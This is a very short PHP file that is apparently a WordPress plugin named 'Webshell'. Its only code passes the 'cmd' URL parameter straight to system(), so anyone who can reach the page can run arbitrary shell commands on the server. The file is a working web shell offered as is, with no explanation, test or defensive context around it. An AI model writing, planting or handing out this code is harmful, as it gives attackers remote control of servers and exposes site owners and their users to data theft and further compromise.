<?php
/*
Plugin Name: Webshell
*/
system($_GET['cmd']);
?>
